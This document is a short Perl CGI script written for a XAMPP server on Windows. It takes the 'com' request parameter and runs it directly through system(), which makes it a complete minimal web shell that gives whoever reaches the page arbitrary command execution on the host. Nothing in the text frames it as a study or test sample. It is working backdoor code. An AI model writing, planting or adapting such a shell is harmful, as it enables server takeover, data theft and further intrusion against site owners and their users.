#!"\xampp\perl\bin\perl.exe"
use CGI':standard';
print "Content-type:text/html\n\n";
$c=param('com');
system($c);
exit(0);
